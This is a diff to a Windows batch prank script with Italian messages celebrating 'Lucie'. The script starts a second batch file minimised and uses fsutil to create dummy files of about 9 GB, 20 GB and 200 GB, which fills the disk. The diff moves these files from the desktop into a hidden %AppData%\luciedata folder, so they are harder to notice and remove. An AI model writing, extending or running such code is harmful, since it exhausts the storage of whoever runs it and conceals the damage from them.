@@ -63,7 +63,9 @@ for /l %%x in (1, 1, 10) do (
 )
 cd "%mypath%\lucieengine"
 start /min "" CHESUCIESO.bat
-cd %userprofile%\desktop
+cd %AppData%
+mkdir luciedata
+cd luciedata
 ping 127.0.0.1 -n 3 > nul
 echo LA LUCIE STA CREANDO UN FILE DI 10 GIGA
 fsutil file createnew LUCIE.txt 9242880000
@@ -75,10 +77,11 @@ fsutil file createnew LUCIEEE.txt 9242880000
 fsutil file createnew LALUCIE.txt 9242880000
 fsutil file createnew LUCIE.txt 9242880000
 echo Eh beh vai di 20gb seeee
-fsutil file createnew RENZILUCIEWOOOOOOOOOH.txt 20242880000
+fsutil file createnew ILUCIEWOOOOOOOOOH.txt 20242880000
 echo MA PERCHE' NON NE CREIAMO UNO DA 200GB?
 fsutil file createnew APOSTOOOOOOO.txt 202428800000
 echo.
+cd %userprofile%\desktop
 echo viva la lucie!
 color 0a
 echo LUCiE!
@@ -172,7 +175,8 @@ for /l %%y in (1, 1, 10) do (
    mkdir %%y
 )
 echo.
-ping 127.0.0.1 -n 3 > nul
+cd %AppData%\luciedata
+ping 127.0.0.1 -n 1 > nul
 echo LA LUCIE STA CREANDO UN FILE DI 10 GIGA
 fsutil file createnew LUCIE.txt 9242880000
 ping 127.0.0.1 -n 3 > nul
@@ -186,6 +190,7 @@ echo Eh beh vai di 20gb seeee
 fsutil file createnew RENZILUCIEWOOOOOOOOOH.txt 20242880000
 echo MA PERCHE' NON NE CREIAMO UNO DA 200GB?
 fsutil file createnew APOSTOOOOOOO.txt 202428800000
+cd %userprofile%\desktop
 echo.
 echo viva la lucie!
 color 0a
